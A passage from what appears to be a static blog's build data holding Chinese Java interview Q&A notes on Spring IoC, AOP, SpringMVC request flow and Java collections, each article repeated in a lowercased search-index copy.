@JsonIgnore json响应式忽略这个属性 private Date hiredate;\n\n17. 使用注解完成IOC的流程？\n 1. 添加context命名空间以及schemaLocation\n 2. 配置文件中添加上下文组件扫描<context:component-scan base-package="com"/>\n 3. 给所有需要放入IOC容器中的组件添加注解@Component/@S../@C../@R../@Scope\n 4. 给所有需要注入的属性添加注解@Autowired或@Resource\n\n18. @Resource和@Autowired的区别？\n 1. 来源不同\n    @Autowired来自Spring类库中，@Resource是J2EE官方类库中的\n 2. 底层匹配机制不同\n    @Autowired优先按照类型进行匹配，如果存在一个接口多个实现类， 再去按照属性名匹配， 如果匹配不到，抛出异常NoUniqueBeanDefinitionException， 此时，可通过 Qualifier("对象名") 指定注入对象\n    @Resource优先按照属性名进行匹配，如果匹配不到，再去按照类型进行匹配， 如果匹配到多个类型，抛出异常NoUniqueBeanDefinitionException 此时，可通过 @Resource(name="对象名") 指定注入对象\n\n19. 反射涉及到哪些类？分别对应哪些方法？\n * Class：太多， 比如getDeclaredConstructors()， c.newInstance()\n * Field： get(obj)，set(obj,value)\n * Method： invoke(obj, a.class, b.class, ...)\n * Constructor： newInstance(a.class, b.class ...)，setAccessible(true)\n\n20. 常用设计模式？\n\n单例模式， 工厂模式， 观察者模式(监听器)， 装饰者模式(包装流)， 代理模式(AOP)\n\n21. spring有几种通知(增强)？\n 1. 前置通知 before\n 2. 后置通知 after afterReturnning\n 3. 环绕通知 aroud\n 4. 异常通知 throws\n\n22. 都有哪几种动态代理？\n * jdk 依赖接口\n * cglib 继承关系\n\n\n# SpringMVC\n\n1、什么是Spring MVC ？简单介绍下你对springMVC的理解?\n\nSpring MVC是一个基于MVC架构的用来简化web应用程序开发的应用开发框架，它是Spring的一个模块,无需中间整合层来整合。\n\n它和Struts2一样都属于表现层框架。在web模型中，MVC是一种很流行的框架，通过把Model，View，Controller分离，把较为复杂的web应用分成逻辑清晰的几部分，简化开发，减少出错，方便组内开发人员之间的配合。\n\n2、SpringMVC的流程？\n\n（1）用户发送请求至前端控制器 DispatcherServlet；\n\n（2） DispatcherServlet收到请求后，调用 HandlerMapping 处理器映射器，请求获取Handle；\n\n（3）处理器映射器根据请求url找到具体的处理器，生成处理器对象及处理器拦截器(如果有则生成)一并返回给DispatcherServlet；\n\n（4）DispatcherServlet通过 HandlerAdapter 处理器适配器调用处理器；\n\n（5）执行处理器(Handler，也叫后端控制器)；\n\n（6）Handler执行完成返回ModelAndView；\n\n（7）HandlerAdapter将Handler执行结果ModelAndView返回给DispatcherServlet；\n\n（8）DispatcherServlet将ModelAndView传给 ViewReslover 视图解析器进行解析；\n\n（9）ViewReslover解析后返回具体View；\n\n（10）DispatcherServlet对View进行渲染视图（即将模型数据填充至视图中）\n\n（11）DispatcherServlet响应用户。\n\n3、Springmvc的优点:\n\n（1）它是基于组件技术的。全部的应用对象,无论控制器和视图,还是业务对象之类的都是 java组件，并且和Spring提供的其他基础结构紧密集成\n\n（2）不依赖于Servlet API(目标虽是如此,但是在实现的时候确实是依赖于Servlet的)\n\n（3）可以任意使用各种视图技术，而不仅仅局限于JSP\n\n（4）支持各种请求资源的映射策略\n\n（5）它应是易于扩展的\n\n4、Spring MVC的主要组键？\n\n（1）前端控制器DispatcherServlet（不需要程序员开发）\n\n作用：接收请求、响应结果 相当于转发器，有了DispatcherServlet 就减少了其它组件之间的耦合度。\n\n（2）处理器映射器HandlerMapping（不需要程序员开发）\n\n作用：根据请求的URL来查找Handler\n\n（3）处理器适配器HandlerAdapter\n\n注意：在编写Handler的时候要按照HandlerAdapter要求的规则去编写，这样适配器HandlerAdapter才可以正确的去执行Handler。\n\n（4）处理器Handler（需要程序员开发）\n\n（5）视图解析器 ViewResolver（不需要程序员开发）\n\n作用：进行视图的解析 根据视图逻辑名解析成真正的视图（view）\n\n（6）视图View（需要程序员开发jsp）\n\nView是一个接口， 它的实现类支持不同的视图类型（jsp，freemarker，pdf等等）\n\n5、springMVC和struts2的区别有哪些?\n\n（1）入口不同：springmvc的入口是一个servlet即前端控制器（DispatchServlet）\nstruts2入口是一个filter过虑器（StrutsPrepareAndExecuteFilter）。\n\n（2）实现方式不同：springmvc是基于方法开发(一个url对应一个方法)，请求参数传递到方法的形参，可以设计为单例或多例(建议单例)\nstruts2是基于类开发，传递参数是通过类的属性，只能设计为多例。\n\n（3）参数解析不同：Struts采用值栈存储请求和响应的数据，通过OGNL存取数据\nspringmvc通过参数解析器是将request请求内容解析，并给方法形参赋值，将数据和视图封装成ModelAndView对象，最后又将ModelAndView中的模型数据通过reques域传输到页面。Jsp视图解析器默认使用jstl。\n\n6、SpringMVC怎么样设定重定向和转发的？\n\n（1）在返回值前面加"forward:"就可以让结果转发,譬如"forward:user.do?name=method4"\n\n（2）在返回值前面加"redirect:"就可以让返回值重定向,譬如"redirect:http://www.baidu.com"\n\n7、SpringMvc怎么和AJAX相互调用的？\n\n通过Jackson框架就可以把Java里面的对象直接转化成Js可以识别的Json对象。具体步骤如下 ：\n\n（1）加入Jackson.jar\n\n（2）在配置文件中配置json的映射\n\n（3）在接受Ajax的方法里面可以直接返回Object,List等,但方法前面要加上@ResponseBody注解。\n\n8、SpringMvc里面拦截器是怎么写的：\n\n有两种写法,一种是实现HandlerInterceptor接口,另外一种是继承适配器类,接着在接口方法当中，实现处理逻辑；然后在SpringMvc的配置文件中配置拦截器即可:\n\n\x3c!-- 配置SpringMvc的拦截器 --\x3e\n<mvc:interceptors>\n\t\n    \x3c!-- 配置一个拦截器的Bean就可以了 默认是对所有请求都拦截 --\x3e\n\t<bean id="myInterceptor" class="com.abc.action.MyHandlerInterceptor"></bean>\n\t\n    \x3c!-- 只针对部分请求拦截 --\x3e\n\t<mvc:interceptor>\n    \t<mvc:mapping path="/modelMap.do" />\n\t\t<bean class="com.abc.action.MyHandlerInterceptorAdapter" />\n\t</mvc:interceptor>\n\n</mvc:interceptors>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n9、如何解决POST请求中文乱码问题，GET的又如何处理呢？\n\n（1）解决post请求乱码问题：\n\n在web.xml中加入：\n\n<filter>\n\n  <filter-name>CharacterEncodingFilter</filter-name>\n\n  <filter-class>org.springframework.web.filter.CharacterEncodingFilter</filter-class>\n\n  <init-param>\n\n    <param-name>encoding</param-name>\n\n    <param-value>utf-8</param-value>\n\n  </init-param>\n\n</filter>\n\n<filter-mapping>\n\n  <filter-name>CharacterEncodingFilter</filter-name>\n\n  <url-pattern>/*</url-pattern>\n\n</filter-mapping>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n（2）解决get请求中文参数出现乱码解决方法有两个：\n\n①修改tomcat配置文件添加编码与工程编码一致，如下：\n\n<ConnectorURIEncoding="utf-8" connectionTimeout="20000" port="8080" protocol="HTTP/1.1" redirectPort="8443"/>\n\n②另外一种方法对参数进行重新编码：\n\nString userName = new String(request.getParamter("userName").getBytes("ISO8859-1"),"utf-8")\n\nISO8859-1是tomcat默认编码，需要将tomcat编码后的内容按utf-8编码。\n\n10、Spring MVC的异常处理 ？\n\n可以将异常抛给Spring框架，由Spring框架来处理；我们只需要配置简单的异常处理器，在异常处理器中添视图页面即可。\n\n11、SpringMvc的核心入口类是什么,Struts1,Struts2的分别是什么：\n\nSpringMvc的是DispatchServlet\n\nStruts1的是ActionServlet\n\nStruts2的是StrutsPrepareAndExecuteFilter\n\n12、SpringMvc的控制器是不是单例模式,如果是,有什么问题,怎么解决？\n\n是单例模式，所以在多线程访问的时候有线程安全问题，不要用同步，会影响性能的，解决方案是在控制器里面不能写字段。\n\n13、SpingMvc中的控制器的注解一般用那个,有没有别的注解可以替代？\n\n一般用@Conntroller注解,表示是表现层,不能用用别的注解代替。\n\n14、 @RequestMapping注解用在类上面有什么作用？\n\n是一个用来处理请求地址映射的注解，可用于类或方法上。用于类上，表示类中的所有响应请求的方法都是以该地址作为父路径。\n\n15、怎么样把某个请求映射到特定的方法上面？\n\n直接在方法上面加上注解@RequestMapping,并且在这个注解里面写上要拦截的路径。\n\n16、如果在拦截请求中,我想拦截get方式提交的方法,怎么配置？\n\n可以在@RequestMapping注解里面加上method=RequestMethod.GET。\n\n17、怎么样在方法里面得到Request,或者Session？\n\n直接在方法的形参中声明request,SpringMvc就自动把request对象传入。\n\n18、如果想在拦截的方法里面得到从前台传入的参数,怎么得到？\n\n直接在形参里面声明这个参数就可以,但必须名字和传过来的参数一样。\n\n19、如果前台有很多个参数传入,并且这些参数都是一个对象的,那么怎么样快速得到这个对象？\n\n直接在方法中声明这个对象,SpringMvc就自动会把属性赋值到这个对象里面。\n\n20、SpringMvc中函数的返回值是什么？\n\n返回值可以有很多类型,有String, ModelAndView，但一般用String比较好。\n\n21、SpringMvc用什么对象从后台向前台传递数据的？\n 1. 使用Map、Model和ModelMap的方式\n\n@RequestMapping("/test")\npublic String test(Map<String,Object> map,Model model,ModelMap modelMap,HttpServletRequest request){\n    //1.放在map里  \n    map.put("names", Arrays.asList("caoyc","zhh","cjx"));\n    //2.放在model里 建议使用\n    model.addAttribute("time", new Date());\n    //3.放在request里  \n    request.setAttribute("request", "requestValue");\n    //4.放在modelMap中 \n    modelMap.addAttribute("city", "ChengDu");\n    modelMap.put("gender", "male");\n    return "hello";\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nJSP写法:\n\ntime:${requestScope.time}\nnames:${requestScope.names }\ncity:${requestScope.city }\ngender:${requestScope.gender }\nrequest:${requestScope.request}\n\n\n1\n2\n3\n4\n5\n\n 2. 使用ModelAndView的方式:\n\n@RequestMapping(value="/test2.do",method = RequestMethod.POST)  \npublic ModelAndView checknameIsExist2(@RequestParam("sid") String sid,Model model,HttpServletRequest request) {  \n    ModelAndView mav = new ModelAndView();  \n    mav.addObject("ModelAndView", "ModelAndViewValue");  \n    //设置要跳转的页面，与返回值时String时返回success类似，以下跳转到/student/studentList.jsp  \n    mav.setViewName("/student/studentList");  \n    return mav;  \n\n\n1\n2\n3\n4\n5\n6\n7\n\n22、SpringMvc中有个类把视图和数据都合并的一起的,叫什么？\n\n叫ModelAndView。\n\n23、怎么样把ModelMap里面的数据放入Session里面？\n\n可以在类上面加上 @SessionAttributes 注解,里面包含的字符串就是要放入session里面的key。\n\n24、当一个方法向AJAX返回特殊对象,譬如Object,List等,需要做什么处理？\n\n要加上 @ResponseBody 注解。',normalizedContent:'# spring基础\n\n1. spring两大核心？\n\nioc控制反转， aop面向切面编程\n\n2. ioc控制反转到底反转了什么？\n\n创建对象的过程，形成对象与对象之间依赖关系的操作\n(martin: 依赖对象的获得被反转了，本来应该是我们自己new， 现在是通过springioc容器注入)\n\n3. 什么是aop？\n\naop即面向切面编程，关注的是非核心业务的处理\n用到的地方：比如日志、网站的访问次数等\n主要目的:：核心业务和非核心业务之间的解耦\n底层使用了动态代理模式\n要素：advice(非核心业务的载体)， pointcut(非核心业务的放置位置)， advisor(建立advice和pointcut之间的联系)\n\n4. 反转之后的好处？\n\n有助于类与类之间的解耦\n\n5. ioc的好处？\n\n将对象的创建和属性的赋值完全转交给spring， 从而降低类与类之间的依赖关系，达到松散耦合的目的\n\n6. ico的核心？\n\nioc容器之所以叫ioc容器， 是因为其中的ioc指的是将主动new变成了被动注入\n从此角度出发， ioc的核心是di依赖注入\n\n7. di是什么？\n\n依赖注入，指的是建立每个对象之间关系的方式，也就是对属性赋值的操作\n\n8. bean的属性都有？\n\nid：(每个ioc容器对象的唯一标识)，\nclass：(当前类对应的类型)，\nscope：(作用范围)，\nlazy-init：(是否 延迟加载)，\nfactory-method：(指定返回返回该对象的方法名称)，\nfactory-bean：(指定工厂实例)，\ninit-method：(对象初始化调用的方法)，\ndestroy-method\n\n9. scope分别有几种情况？如何配置？\n\n * singleton，prototype，request，session，globalsession\n\n * 一般无状态的类的对象都配置成singleton，无状态的类一般指像service和dao层这样逻辑处理类\n   有状态的类需要设置成prototype或request，一般指像action一样存在多实例， 并且其中数据都不同\n\n10. spring创建对象的方式？\n 1. 构造方法创建(id+class)；\n 2. 静态工厂创建(class+factory-method)；\n 3. 实例工厂创建(factory-bean+factory-method)\n\n11. 完成注入的方式？\n 1. setter注入 <property ...>\n 2. 构造方法注入 <constructor-arg ...>\n\n12. schema是什么？优势？\n\n * 用来校验xml文件规范的xsd的文件\n   \n   1. 基于xml语法\n   2. 扩充了数据类型\n   3. 支持命名空间\n   * schema最重要的能力之一就是对数据类型的支持\n\n13. 复杂属性如何注入？\n * 数组/list/set\n   <property><array/list/set><value>value</value>\n * map\n   <map><entry key="" value=""/>\n * properties\n   <props><prop key="">vlaue</prop>\n\n14. 常用spring注解？\n\n@component， @repository， @service， @controller @autowired， @qualifier， @scope，@value @aspect， @pointcut， @before， @after， @afterreturning， @around， @afterthrowing\n\n15. 接受文件:\n\n@requestparam(value="file") multipartfile file\n\n16. 关于日期、时间\n * 映射类声明变量前，加入此注解:\n   1. @datetimeformat是将string转换成date，一般前台给后台传值时用(springmvc用)\n   2. 将date转换成string 一般后台传值给前台时设置响应方式为 @jsonformat(pattern="yyyy-mm-dd")\n   3. @jsonformat(pattern = "yyyy-mm-dd hh:mm:ss"，timezone = "gmt+8")\n      只争对json响应式的处理(中国为东8区)\n   4. @jsonignore json响应式忽略这个属性 private date hiredate;\n\n17. 使用注解完成ioc的流程？\n 1. 添加context命名空间以及schemalocation\n 2. 配置文件中添加上下文组件扫描<context:component-scan base-package="com"/>\n 3. 给所有需要放入ioc容器中的组件添加注解@component/@s../@c../@r../@scope\n 4. 给所有需要注入的属性添加注解@autowired或@resource\n\n18. @resource和@autowired的区别？\n 1. 来源不同\n    @autowired来自spring类库中，@resource是j2ee官方类库中的\n 2. 底层匹配机制不同\n    @autowired优先按照类型进行匹配，如果存在一个接口多个实现类， 再去按照属性名匹配， 如果匹配不到，抛出异常nouniquebeandefinitionexception， 此时，可通过 qualifier("对象名") 指定注入对象\n    @resource优先按照属性名进行匹配，如果匹配不到，再去按照类型进行匹配， 如果匹配到多个类型，抛出异常nouniquebeandefinitionexception 此时，可通过 @resource(name="对象名") 指定注入对象\n\n19. 反射涉及到哪些类？分别对应哪些方法？\n * class：太多， 比如getdeclaredconstructors()， c.newinstance()\n * field： get(obj)，set(obj,value)\n * method： invoke(obj, a.class, b.class, ...)\n * constructor： newinstance(a.class, b.class ...)，setaccessible(true)\n\n20. 常用设计模式？\n\n单例模式， 工厂模式， 观察者模式(监听器)， 装饰者模式(包装流)， 代理模式(aop)\n\n21. spring有几种通知(增强)？\n 1. 前置通知 before\n 2. 后置通知 after afterreturnning\n 3. 环绕通知 aroud\n 4. 异常通知 throws\n\n22. 都有哪几种动态代理？\n * jdk 依赖接口\n * cglib 继承关系\n\n\n# springmvc\n\n1、什么是spring mvc ？简单介绍下你对springmvc的理解?\n\nspring mvc是一个基于mvc架构的用来简化web应用程序开发的应用开发框架，它是spring的一个模块,无需中间整合层来整合。\n\n它和struts2一样都属于表现层框架。在web模型中，mvc是一种很流行的框架，通过把model，view，controller分离，把较为复杂的web应用分成逻辑清晰的几部分，简化开发，减少出错，方便组内开发人员之间的配合。\n\n2、springmvc的流程？\n\n（1）用户发送请求至前端控制器 dispatcherservlet；\n\n（2） dispatcherservlet收到请求后，调用 handlermapping 处理器映射器，请求获取handle；\n\n（3）处理器映射器根据请求url找到具体的处理器，生成处理器对象及处理器拦截器(如果有则生成)一并返回给dispatcherservlet；\n\n（4）dispatcherservlet通过 handleradapter 处理器适配器调用处理器；\n\n（5）执行处理器(handler，也叫后端控制器)；\n\n（6）handler执行完成返回modelandview；\n\n（7）handleradapter将handler执行结果modelandview返回给dispatcherservlet；\n\n（8）dispatcherservlet将modelandview传给 viewreslover 视图解析器进行解析；\n\n（9）viewreslover解析后返回具体view；\n\n（10）dispatcherservlet对view进行渲染视图（即将模型数据填充至视图中）\n\n（11）dispatcherservlet响应用户。\n\n3、springmvc的优点:\n\n（1）它是基于组件技术的。全部的应用对象,无论控制器和视图,还是业务对象之类的都是 java组件，并且和spring提供的其他基础结构紧密集成\n\n（2）不依赖于servlet api(目标虽是如此,但是在实现的时候确实是依赖于servlet的)\n\n（3）可以任意使用各种视图技术，而不仅仅局限于jsp\n\n（4）支持各种请求资源的映射策略\n\n（5）它应是易于扩展的\n\n4、spring mvc的主要组键？\n\n（1）前端控制器dispatcherservlet（不需要程序员开发）\n\n作用：接收请求、响应结果 相当于转发器，有了dispatcherservlet 就减少了其它组件之间的耦合度。\n\n（2）处理器映射器handlermapping（不需要程序员开发）\n\n作用：根据请求的url来查找handler\n\n（3）处理器适配器handleradapter\n\n注意：在编写handler的时候要按照handleradapter要求的规则去编写，这样适配器handleradapter才可以正确的去执行handler。\n\n（4）处理器handler（需要程序员开发）\n\n（5）视图解析器 viewresolver（不需要程序员开发）\n\n作用：进行视图的解析 根据视图逻辑名解析成真正的视图（view）\n\n（6）视图view（需要程序员开发jsp）\n\nview是一个接口， 它的实现类支持不同的视图类型（jsp，freemarker，pdf等等）\n\n5、springmvc和struts2的区别有哪些?\n\n（1）入口不同：springmvc的入口是一个servlet即前端控制器（dispatchservlet）\nstruts2入口是一个filter过虑器（strutsprepareandexecutefilter）。\n\n（2）实现方式不同：springmvc是基于方法开发(一个url对应一个方法)，请求参数传递到方法的形参，可以设计为单例或多例(建议单例)\nstruts2是基于类开发，传递参数是通过类的属性，只能设计为多例。\n\n（3）参数解析不同：struts采用值栈存储请求和响应的数据，通过ognl存取数据\nspringmvc通过参数解析器是将request请求内容解析，并给方法形参赋值，将数据和视图封装成modelandview对象，最后又将modelandview中的模型数据通过reques域传输到页面。jsp视图解析器默认使用jstl。\n\n6、springmvc怎么样设定重定向和转发的？\n\n（1）在返回值前面加"forward:"就可以让结果转发,譬如"forward:user.do?name=method4"\n\n（2）在返回值前面加"redirect:"就可以让返回值重定向,譬如"redirect:http://www.baidu.com"\n\n7、springmvc怎么和ajax相互调用的？\n\n通过jackson框架就可以把java里面的对象直接转化成js可以识别的json对象。具体步骤如下 ：\n\n（1）加入jackson.jar\n\n（2）在配置文件中配置json的映射\n\n（3）在接受ajax的方法里面可以直接返回object,list等,但方法前面要加上@responsebody注解。\n\n8、springmvc里面拦截器是怎么写的：\n\n有两种写法,一种是实现handlerinterceptor接口,另外一种是继承适配器类,接着在接口方法当中，实现处理逻辑；然后在springmvc的配置文件中配置拦截器即可:\n\n\x3c!-- 配置springmvc的拦截器 --\x3e\n<mvc:interceptors>\n\t\n    \x3c!-- 配置一个拦截器的bean就可以了 默认是对所有请求都拦截 --\x3e\n\t<bean id="myinterceptor" class="com.abc.action.myhandlerinterceptor"></bean>\n\t\n    \x3c!-- 只针对部分请求拦截 --\x3e\n\t<mvc:interceptor>\n    \t<mvc:mapping path="/modelmap.do" />\n\t\t<bean class="com.abc.action.myhandlerinterceptoradapter" />\n\t</mvc:interceptor>\n\n</mvc:interceptors>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n9、如何解决post请求中文乱码问题，get的又如何处理呢？\n\n（1）解决post请求乱码问题：\n\n在web.xml中加入：\n\n<filter>\n\n  <filter-name>characterencodingfilter</filter-name>\n\n  <filter-class>org.springframework.web.filter.characterencodingfilter</filter-class>\n\n  <init-param>\n\n    <param-name>encoding</param-name>\n\n    <param-value>utf-8</param-value>\n\n  </init-param>\n\n</filter>\n\n<filter-mapping>\n\n  <filter-name>characterencodingfilter</filter-name>\n\n  <url-pattern>/*</url-pattern>\n\n</filter-mapping>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n（2）解决get请求中文参数出现乱码解决方法有两个：\n\n①修改tomcat配置文件添加编码与工程编码一致，如下：\n\n<connectoruriencoding="utf-8" connectiontimeout="20000" port="8080" protocol="http/1.1" redirectport="8443"/>\n\n②另外一种方法对参数进行重新编码：\n\nstring username = new string(request.getparamter("username").getbytes("iso8859-1"),"utf-8")\n\niso8859-1是tomcat默认编码，需要将tomcat编码后的内容按utf-8编码。\n\n10、spring mvc的异常处理 ？\n\n可以将异常抛给spring框架，由spring框架来处理；我们只需要配置简单的异常处理器，在异常处理器中添视图页面即可。\n\n11、springmvc的核心入口类是什么,struts1,struts2的分别是什么：\n\nspringmvc的是dispatchservlet\n\nstruts1的是actionservlet\n\nstruts2的是strutsprepareandexecutefilter\n\n12、springmvc的控制器是不是单例模式,如果是,有什么问题,怎么解决？\n\n是单例模式，所以在多线程访问的时候有线程安全问题，不要用同步，会影响性能的，解决方案是在控制器里面不能写字段。\n\n13、spingmvc中的控制器的注解一般用那个,有没有别的注解可以替代？\n\n一般用@conntroller注解,表示是表现层,不能用用别的注解代替。\n\n14、 @requestmapping注解用在类上面有什么作用？\n\n是一个用来处理请求地址映射的注解，可用于类或方法上。用于类上，表示类中的所有响应请求的方法都是以该地址作为父路径。\n\n15、怎么样把某个请求映射到特定的方法上面？\n\n直接在方法上面加上注解@requestmapping,并且在这个注解里面写上要拦截的路径。\n\n16、如果在拦截请求中,我想拦截get方式提交的方法,怎么配置？\n\n可以在@requestmapping注解里面加上method=requestmethod.get。\n\n17、怎么样在方法里面得到request,或者session？\n\n直接在方法的形参中声明request,springmvc就自动把request对象传入。\n\n18、如果想在拦截的方法里面得到从前台传入的参数,怎么得到？\n\n直接在形参里面声明这个参数就可以,但必须名字和传过来的参数一样。\n\n19、如果前台有很多个参数传入,并且这些参数都是一个对象的,那么怎么样快速得到这个对象？\n\n直接在方法中声明这个对象,springmvc就自动会把属性赋值到这个对象里面。\n\n20、springmvc中函数的返回值是什么？\n\n返回值可以有很多类型,有string, modelandview，但一般用string比较好。\n\n21、springmvc用什么对象从后台向前台传递数据的？\n 1. 使用map、model和modelmap的方式\n\n@requestmapping("/test")\npublic string test(map<string,object> map,model model,modelmap modelmap,httpservletrequest request){\n    //1.放在map里  \n    map.put("names", arrays.aslist("caoyc","zhh","cjx"));\n    //2.放在model里 建议使用\n    model.addattribute("time", new date());\n    //3.放在request里  \n    request.setattribute("request", "requestvalue");\n    //4.放在modelmap中 \n    modelmap.addattribute("city", "chengdu");\n    modelmap.put("gender", "male");\n    return "hello";\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\njsp写法:\n\ntime:${requestscope.time}\nnames:${requestscope.names }\ncity:${requestscope.city }\ngender:${requestscope.gender }\nrequest:${requestscope.request}\n\n\n1\n2\n3\n4\n5\n\n 2. 使用modelandview的方式:\n\n@requestmapping(value="/test2.do",method = requestmethod.post)  \npublic modelandview checknameisexist2(@requestparam("sid") string sid,model model,httpservletrequest request) {  \n    modelandview mav = new modelandview();  \n    mav.addobject("modelandview", "modelandviewvalue");  \n    //设置要跳转的页面，与返回值时string时返回success类似，以下跳转到/student/studentlist.jsp  \n    mav.setviewname("/student/studentlist");  \n    return mav;  \n\n\n1\n2\n3\n4\n5\n6\n7\n\n22、springmvc中有个类把视图和数据都合并的一起的,叫什么？\n\n叫modelandview。\n\n23、怎么样把modelmap里面的数据放入session里面？\n\n可以在类上面加上 @sessionattributes 注解,里面包含的字符串就是要放入session里面的key。\n\n24、当一个方法向ajax返回特殊对象,譬如object,list等,需要做什么处理？\n\n要加上 @responsebody 注解。',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"Q&A宝典-Java进阶篇",frontmatter:{title:"Q&A宝典-Java进阶篇",date:"2019-04-15T00:00:00.000Z",tags:["复习"],categories:["知识晶体 Q&A"],isShowComments:!1},regularPath:"/views/qaq/sum_java_002.html",relativePath:"views/qaq/sum_java_002.md",key:"v-01d17c50",path:"/views/qaq/sum_java_002.html",headers:[{level:2,title:"List和Map",slug:"list和map",normalizedTitle:"list和map",charIndex:2},{level:2,title:"泛型",slug:"泛型",normalizedTitle:"泛型",charIndex:1029}],headersStr:"List和Map 泛型",content:"# List和Map\n\n1. 接口和抽象类之间的区别？\n\n 1. 分别表示的类型不同\n    \n    接口：interface\n    抽象类：class\n\n 2. 里面定义的属性修饰符不同\n    \n    接口：里面定义的属性默认都是静态的最终变量（public static final）\n    抽象类：里面定义的属性默认是（default）\n\n 3. 里面定义的方法不同\n    \n    接口：里面定义的方法默认都是抽象方法（public abstarct）\n    从 jdk8.0开始 接口里面可以定义普通方法\n    抽象类：里面既可以定义抽象方法 又可以定义普通方法\n\n2. ArrayList和Vector之间的区别？\n\n * Vector：同一时间允许单个线程进行访问 效率较低，但是不会出现并发错误\n   ArrayList：同一时间允许多个线程进行访问 效率较高，但是可能会出现并发错误\n\n * 从jdk5.0开始 集合的工具类里面提供一个方法(synchronizedList) 可以将线程不安全的ArrayList对象变成线程安全的集合对象，于是Vector渐渐被淘汰\n\n3. ArrayList和LinkedList之间的区别？\n\n * ArrayList：底层基于数组实现的\n   \n   优点：随机访问 遍历查找效率高\n   缺点：添加/删除元素\n\n * LinkedList：底层基于链表实现的\n   \n   优点：添加/删除元素效率高\n   缺点：随机访问/遍历查找效率低\n\n * *：当正常开发的时候 尽量避免使用LinkedList里面的get(下标)方法\n\n4. HashMap和Hashtable之间的区别？\n\n 1. 同步特性不同：\n    \n    * HashMap 同一时间允许多个线程进行访问 效率较高，但是可能会出现并发错误\n    * Hashtable 同一时间允许一个线程进行访问 效率较低，但是不会出现并发错误\n    * 从jdk5.0开始，集合的工具类里面提供一个方法（synchronizedList） 可以将线程不安全的HashMap对象变成线程安全的集合对象\n\n 2. 对null的要求不同\n    \n    * HashMap无论主键还是值都可以存放null，但是由于主键唯一 所以主键只能添加一个null\n    * Hashtable无论主键还是值都不能装null，一旦泛型里面装null 都会触发NullPointerException\n\n 3. 底层分组不同：\n    \n    * HashMap底层数组大小默认为16，程序员可以随意的定义，但是最终一定是2的n次方数\n    * Hashtable底层数组大小默认为11，程序员可以随意定义\n\n 4. 出现的版本不同\n    \n    * Hashtable：since jdk1.0\n    * HashMap：since jdk1.2\n\n5. hashmap 红黑树\n\n * 负载因子，代表了table的填充度有多少，默认是0.75\n   \n   加载因子存在的原因，还是因为减缓哈希冲突，提高查询效率。如果初始桶为16，等到满16个元素才扩容，某些桶里可能就有不止一个元素了。 所以加载因子默认为0.75，也就是说大小为16的HashMap，到了第13个元素，就会扩容成32。\n\n * 为何HashMap的数组长度一定是2的次幂（减少hash碰撞）\n   \n   扩容时需要重新计算数组索引index = h&(length-1)，需要进行大量的与运算，保证2的次幂，可以保证在进行与运算时，(length-1)的值的二进制所有的位均为1，这种情况下，Index的结果等于hashCode的最后几位。只要输入的hashCode本身符合均匀分布，Hash算法的结果就是均匀的。\n\n\n# 泛型\n\n1. 泛型中的通配符 T，E，K，V，？\n\n本质上这些个都是通配符，没啥区别，换成 A-Z 之间的任何一个 字母都可以。\n通常情况下，T，E，K，V，？ 是这样约定的：\n\n * ？ 表示不确定的 java 类型\n * T (type) 表示具体的一个java类型\n * K V (key value) 分别代表java键值中的Key Value\n * E (element) 代表Element\n\n> 可参考：掘金",normalizedContent:"# list和map\n\n1. 接口和抽象类之间的区别？\n\n 1. 分别表示的类型不同\n    \n    接口：interface\n    抽象类：class\n\n 2. 里面定义的属性修饰符不同\n    \n    接口：里面定义的属性默认都是静态的最终变量（public static final）\n    抽象类：里面定义的属性默认是（default）\n\n 3. 里面定义的方法不同\n    \n    接口：里面定义的方法默认都是抽象方法（public abstarct）\n    从 jdk8.0开始 接口里面可以定义普通方法\n    抽象类：里面既可以定义抽象方法 又可以定义普通方法\n\n2. arraylist和vector之间的区别？\n\n * vector：同一时间允许单个线程进行访问 效率较低，但是不会出现并发错误\n   arraylist：同一时间允许多个线程进行访问 效率较高，但是可能会出现并发错误\n\n * 从jdk5.0开始 集合的工具类里面提供一个方法(synchronizedlist) 可以将线程不安全的arraylist对象变成线程安全的集合对象，于是vector渐渐被淘汰\n\n3. arraylist和linkedlist之间的区别？\n\n * arraylist：底层基于数组实现的\n   \n   优点：随机访问 遍历查找效率高\n   缺点：添加/删除元素\n\n * linkedlist：底层基于链表实现的\n   \n   优点：添加/删除元素效率高\n   缺点：随机访问/遍历查找效率低\n\n * *：当正常开发的时候 尽量避免使用linkedlist里面的get(下标)方法\n\n4. hashmap和hashtable之间的区别？\n\n 1. 同步特性不同：\n    \n    * hashmap 同一时间允许多个线程进行访问 效率较高，但是可能会出现并发错误\n    * hashtable 同一时间允许一个线程进行访问 效率较低，但是不会出现并发错误\n    * 从jdk5.0开始，集合的工具类里面提供一个方法（synchronizedlist） 可以将线程不安全的hashmap对象变成线程安全的集合对象\n\n 2. 对null的要求不同\n    \n    * hashmap无论主键还是值都可以存放null，但是由于主键唯一 所以主键只能添加一个null\n    * hashtable无论主键还是值都不能装null，一旦泛型里面装null 都会触发nullpointerexception\n\n 3. 底层分组不同：\n    \n    * hashmap底层数组大小默认为16，程序员可以随意的定义，但是最终一定是2的n次方数\n    * hashtable底层数组大小默认为11，程序员可以随意定义\n\n 4. 出现的版本不同\n    \n    * hashtable：since jdk1.0\n    * hashmap：since jdk1.2\n\n5. hashmap 红黑树\n\n * 负载因子，代表了table的填充度有多少，默认是0.75\n   \n   加载因子存在的原因，还是因为减缓哈希冲突，提高查询效率。如果初始桶为16，等到满16个元素才扩容，某些桶里可能就有不止一个元素了。 所以加载因子默认为0.75，也就是说大小为16的hashmap，到了第13个元素，就会扩容成32。\n\n * 为何hashmap的数组长度一定是2的次幂（减少hash碰撞）\n   \n   扩容时需要重新计算数组索引index = 